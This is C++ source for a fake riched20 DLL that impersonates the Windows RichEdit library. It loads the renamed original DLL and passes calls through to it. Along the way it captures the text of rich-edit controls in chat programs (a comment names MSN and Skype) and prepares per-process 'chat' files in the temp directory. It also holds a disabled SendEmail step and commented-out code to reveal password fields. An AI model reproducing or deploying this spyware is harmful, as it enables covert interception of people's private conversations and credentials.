// riched20.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include <stdio.h>
#include <process.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <share.h>
#include <time.h>
#include <sys/utime.h>
#include <sys/timeb.h>

typedef struct _tagEnumProcParam
{
	DWORD processid;
	HWND hwnd;
} CEnumProcParam;

const GUID IID_ITextServices = {0x8d33f740, 0xcf58, 0x11ce, {0xa8, 0x9d, 0x00, 0xaa, 0x00, 0x6c, 0xad, 0xc5}};
const GUID IID_ITextHost = {0xc5bdd8d0, 0xd26e, 0x11ce, {0xa8, 0x9e, 0x00, 0xaa, 0x00, 0x6c, 0xad, 0xc5}};
const GUID IID_ITextHost2 = {0xc5bdd8d0, 0xd26e, 0x11ce, {0xa8, 0x9e, 0x00, 0xaa, 0x00, 0x6c, 0xad, 0xc5}};
const GUID IID_ITextDocument = {0x8CC497C0,0xA1DF,0x11CE,{0x80,0x98, 0x00, 0xAA, 0x00, 0x47, 0xBE, 0x5D}};
//const GUID IID_ITextHostEx;

static HMODULE hRich20Lib;
CRITICAL_SECTION g_critical;
static PCreateTextServices _CreateTextServices;

// MSN,Skype

HRESULT WINAPI CreateTextServices(IUnknown *punkOuter, 
      ITextHost *pITextHost, IUnknown **ppUnk)
{
      //DWORD dw = GetSystemDirectory(szLib, MAX_PATH);
      //if(dw == 0) return 0;
      //szLib[dw] = TCHAR('\0');
      //_tcscat(szLib, _T("\\RichEd20.Dll"));

	  //EnterCriticalSection(&g_critical);
      if(!_CreateTextServices)
	  {
	      _TCHAR szLib[MAX_PATH]; //255 is enough
	      memset(szLib, 0, sizeof(szLib));
	  	  _tcscpy(szLib, _T("RichEd20.orig.Dll"));
		  
	      if(!hRich20Lib && !(hRich20Lib = LoadLibrary(szLib)))
		  {
			  //LeaveCriticalSection(&g_critical);
			  return 0;
	      }
		  if(!_CreateTextServices)
		  {
              _CreateTextServices = (HRESULT (__stdcall *) 
                    (IUnknown*, ITextHost*, IUnknown**))GetProcAddress(hRich20Lib, "CreateTextServices");
              if(!_CreateTextServices)
	          {
			      //LeaveCriticalSection(&g_critical);
		          return 0;
	          }
		  }
	  }
	  //LeaveCriticalSection(&g_critical);
	  *ppUnk = new IMyUnknown(punkOuter, pITextHost);
      return S_OK;
}

IMyTextServices::IMyTextServices(ITextServices *lpTx, HWND parenthwnd)
	: m_lpTx(lpTx), m_content(NULL)
{

}

HRESULT IMyTextServices::TxSendMessage(
							UINT msg,
							WPARAM wparam,
							LPARAM lparam,
							LRESULT *plresult)
{
	return m_lpTx->TxSendMessage(msg, wparam, lparam, plresult);
}

HRESULT STDMETHODCALLTYPE IMyTextServices::QueryInterface( 
                /* [in] */ REFIID riid,
                /* [iid_is][out] */ __RPC__deref_out void __RPC_FAR *__RPC_FAR *ppvObject)
{
	return m_lpTx->QueryInterface(riid, ppvObject);
}

ULONG STDMETHODCALLTYPE IMyTextServices::AddRef( void)
{
	return m_lpTx->AddRef();
}

ULONG STDMETHODCALLTYPE IMyTextServices::Release( void)
{
	HRESULT hr;
	SaveToFile();
#if 0
	SendEmail();
#endif
	hr = m_lpTx->Release();
	if(m_content) {
		SysFreeString(m_content);
		m_content = NULL;
	}
	delete this;
	return hr;
}

HRESULT	IMyTextServices::TxDraw(	
							DWORD dwDrawAspect,		
							LONG  lindex,			
							void * pvAspect,		
							DVTARGETDEVICE * ptd,									
							HDC hdcDraw,			
							HDC hicTargetDev,		
							LPCRECTL lprcBounds,	
							LPCRECTL lprcWBounds,	
               				LPRECT lprcUpdate,		
							BOOL (CALLBACK * pfnContinue) (DWORD),
							DWORD dwContinue,
							LONG lViewId)
{
	if(m_content != NULL) {
		SysFreeString(m_content);
		m_content = NULL;
	}
	GetContext(&m_content);
    return m_lpTx->TxDraw(dwDrawAspect, lindex, pvAspect, ptd, hdcDraw, hicTargetDev,
		lprcBounds, lprcWBounds, lprcUpdate, pfnContinue, dwContinue, lViewId);
}

HRESULT	IMyTextServices::TxGetHScroll(
							LONG *plMin,
							LONG *plMax,
							LONG *plPos,
							LONG *plPage,
							BOOL * pfEnabled )
{
	return m_lpTx->TxGetHScroll(plMin, plMax, plPos, plPage, pfEnabled);
}

HRESULT	IMyTextServices::TxGetVScroll(
							LONG *plMin,
							LONG *plMax,
							LONG *plPos,
							LONG *plPage,
							BOOL * pfEnabled )
{
	return m_lpTx->TxGetVScroll(plMin, plMax, plPos, plPage, pfEnabled);
}

HRESULT	IMyTextServices::OnTxSetCursor(
							DWORD dwDrawAspect,		
							LONG  lindex,			
							void * pvAspect,		
							DVTARGETDEVICE * ptd,									
							HDC hdcDraw,			
							HDC hicTargetDev,		
							LPCRECT lprcClient,
							INT x,
							INT y)
{
	return m_lpTx->OnTxSetCursor(dwDrawAspect, lindex, pvAspect, ptd,
		hdcDraw, hicTargetDev, lprcClient, x, y);
}

HRESULT IMyTextServices::TxQueryHitPoint(
							DWORD dwDrawAspect,		
							LONG  lindex,			
							void * pvAspect,		
							DVTARGETDEVICE * ptd,									
							HDC hdcDraw,			
							HDC hicTargetDev,		
							LPCRECT lprcClient,
							INT x,
							INT y,
							DWORD * pHitResult)
{
	return m_lpTx->TxQueryHitPoint(dwDrawAspect, lindex, pvAspect, ptd,
		hdcDraw, hicTargetDev, lprcClient, x, y, pHitResult);
}

HRESULT	IMyTextServices::OnTxInPlaceActivate(LPCRECT prcClient)
{
	return m_lpTx->OnTxInPlaceActivate(prcClient);
}

HRESULT	IMyTextServices::OnTxInPlaceDeactivate()
{
	return m_lpTx->OnTxInPlaceDeactivate();
}

	//@cmember UI activate notification
HRESULT	IMyTextServices::OnTxUIActivate()
{
	return m_lpTx->OnTxUIActivate();
}

	//@cmember UI deactivate notification
HRESULT	IMyTextServices::OnTxUIDeactivate()
{
	return m_lpTx->OnTxUIDeactivate();
}

	//@cmember Get text in control
HRESULT	IMyTextServices::TxGetText(BSTR *pbstrText)
{
	return m_lpTx->TxGetText(pbstrText);
}

	//@cmember Set text in control
HRESULT	IMyTextServices::TxSetText(LPCWSTR pszText)
{
	return m_lpTx->TxSetText(pszText);
}
	
	//@cmember Get x position of
HRESULT IMyTextServices::TxGetCurTargetX(LONG *plongvar)
{
	return m_lpTx->TxGetCurTargetX(plongvar);
}
	//@cmember Get baseline position
HRESULT	IMyTextServices::TxGetBaseLinePos(LONG *plongvar)
{
	return m_lpTx->TxGetBaseLinePos(plongvar);
}

	//@cmember Get Size to fit / Natural size
HRESULT	IMyTextServices::TxGetNaturalSize(
							DWORD dwAspect,
							HDC hdcDraw,
							HDC hicTargetDev,
							DVTARGETDEVICE *ptd,
							DWORD dwMode, 	
							const SIZEL *psizelExtent,
							LONG *pwidth,
							LONG *pheight)
{
	return m_lpTx->TxGetNaturalSize(dwAspect, hdcDraw, hicTargetDev, ptd, dwMode,
		psizelExtent, pwidth, pheight);
}

	//@cmember Drag & drop
HRESULT	IMyTextServices::TxGetDropTarget(IDropTarget **ppDropTarget )
{
	return m_lpTx->TxGetDropTarget(ppDropTarget);
}

	//@cmember Bulk bit property change notifications
HRESULT	IMyTextServices::OnTxPropertyBitsChange(DWORD dwMask, DWORD dwBits)
{
	//dwMask &= ~TXTBIT_USEPASSWORD;
	//dwBits &= ~TXTBIT_USEPASSWORD;
	//dwMask |= TXTBIT_SHOWPASSWORD;
	//dwBits |= TXTBIT_SHOWPASSWORD;
	return m_lpTx->OnTxPropertyBitsChange(dwMask, dwBits);
}

	//@cmember Fetch the cached drawing size
HRESULT	IMyTextServices::TxGetCachedSize(DWORD *pdwWidth, DWORD *pdwHeight)
{
	return m_lpTx->TxGetCachedSize(pdwWidth, pdwHeight);
}

/* ============================= IMyUnknown ============================= */
IMyUnknown::IMyUnknown(IUnknown *punkOuter, ITextHost *pITextHost)
	: m_pITextHost(pITextHost)
{
	HRESULT hr = _CreateTextServices(punkOuter, pITextHost, &m_ppUnk);
	 //((IUnknown*)(m_ppUnk))->QueryInterface(IID_ITextServices, (void**)(&m_lpTx));
}

HWND IMyUnknown::GetITextHostHwnd(void)
{
	if(m_pITextHost == NULL)
		return NULL;
	return WindowFromDC(m_pITextHost->TxGetDC());
}

HRESULT STDMETHODCALLTYPE IMyUnknown::QueryInterface( 
                /* [in] */ REFIID riid,
                /* [iid_is][out] */ __RPC__deref_out void __RPC_FAR *__RPC_FAR *ppvObject)
{
	ITextServices *lpTx;
	HRESULT hr;
	//hr = ((IUnknown*)(m_ppUnk))->QueryInterface(IID_ITextServices, (void**)(&lpTx));
	hr = ((IUnknown*)(m_ppUnk))->QueryInterface(riid, (void**)(&lpTx));
	*ppvObject = new IMyTextServices(lpTx, GetITextHostHwnd());
	return hr;
}

ULONG STDMETHODCALLTYPE IMyUnknown::AddRef(void)
{
	return m_ppUnk->AddRef();
}

 ULONG STDMETHODCALLTYPE IMyUnknown::Release(void)
 {
	 HRESULT hr = m_ppUnk->Release();
	 delete this;
	 return hr;
 }

 const _TCHAR *IMyTextServices::GetTempDir(void)
{
	static _TCHAR chatdir[_MAX_PATH];
	static int getted;
	_TCHAR *p;

	if(!getted)
	{
		memset(chatdir, 0, sizeof(chatdir));
		if((p = _tgetenv(_T("TEMP"))) == NULL
		  && (p = _tgetenv(_T("TMP"))) == NULL
		  && (p = _tgetenv(_T("APPDATA"))) == NULL)
		{
			_tcscpy(chatdir, _T("C:\\system64"));
		}
		else
		{
			_tcscpy(chatdir, p);
		}
		if(_taccess(chatdir, 06) == -1)
		{
			_tmkdir(chatdir);
		}
		getted = 1;
	}
	return chatdir;
}

int IMyTextServices::GetTempPath(_TCHAR *chatpath, _TCHAR *temppath)
{
	_TCHAR exepath[_MAX_PATH], exename[_MAX_FNAME];


	memset(chatpath, 0, sizeof(_TCHAR) * _MAX_PATH);
	memset(temppath, 0, sizeof(_TCHAR) * _MAX_PATH);
	memset(exename, 0, sizeof(exename));
	memset(exepath, 0, sizeof(exepath));
	GetModuleFileName(NULL, exepath, sizeof(exepath) / sizeof(exepath[0]));

	_tsplitpath(exepath, NULL, NULL, exename, NULL);

	int wchars;
	wchars = _sntprintf(chatpath, _MAX_PATH - 1, _T("%s\\chat"), GetTempDir());
	_wmkdir(chatpath);
	_snwprintf(chatpath + wchars, _MAX_PATH - 1u - wchars, L"\\%s%#010X.txt", exename, GetCurrentProcessId());
	
	wchars = _sntprintf(temppath, _MAX_PATH - 1, _T("%s\\temp"), GetTempDir());
	_wmkdir(temppath);
	_snwprintf(temppath + wchars, _MAX_PATH - 1u - wchars, L"\\%s%#010X.txt", exename, GetCurrentProcessId());
	
	return BUFSIZ;
}

int IMyTextServices::GetContext(wchar_t **content)
{
	HRESULT hr;
	if((hr = m_lpTx->TxGetText(content)) == S_OK)	{
		//if(*content != NULL && **content == (OLECHAR)0x000D && *(*content + 1) == _T('\0'))	{
#if 0
		// 参考网址http://www.unicodemap.org/details/0xFFFC/index.html
		if(*content != NULL && (**content == (OLECHAR)0x000D 
			|| (**content >= (OLECHAR)0xFFF0 && **content <= (OLECHAR)0xFFFD)))	{
#endif
		if(*content != NULL && **content == (OLECHAR)0x000D) {
			SysFreeString(*content);
			*content = NULL;
			return -1;
		}
		if(*content == NULL)
			return -1;
	}	
	return 0;
}

/* 返回 finaltxt 的宽字符数 */
unsigned int IMyTextServices::ConvertContext(wchar_t **finaltxt)
{
    if(finaltxt == NULL)
		return 0U;

	wchar_t *pfinaltxt;
    unsigned int contentlen, i, printcount = 0U;

	contentlen = SysStringLen(m_content);
	
	if((*finaltxt = (wchar_t *)malloc((contentlen * 2 + 1 ) * sizeof(wchar_t))) == NULL)
		return 0U;
	
	pfinaltxt = *finaltxt;
	*pfinaltxt++ = 0xFEFF; //用_O_U16TEXT打开文件，就不用手工添加 0xFEFF了。
	for(i = 0U; i < contentlen; i++)	{
		if(m_content[i] == 0x000D) {
			*pfinaltxt++ = L'\r';
			*pfinaltxt++ = L'\n';
		}
		else if(m_content[i] == 0xFFFC)	
			continue;
		else if(iswprint(m_content[i])) {
			*pfinaltxt++ = m_content[i];
			printcount++;
		}
	}
	*pfinaltxt = _T('\0');
	return printcount == 0U ? 0 : pfinaltxt - *finaltxt;
}

void IMyTextServices::SaveToFile(void)
{
	_TCHAR chatpath[_MAX_PATH], temppath[_MAX_PATH];
	unsigned int finaltxtwchars;
	wchar_t *finaltxt;
	if(m_content == NULL)
		return;
	if(GetTempPath(chatpath, temppath) == -1)
		return;
	if((finaltxtwchars = ConvertContext(&finaltxt)) == 0U)
		return;
	::MessageBox(NULL,  finaltxt, _T("test"), MB_OK);
}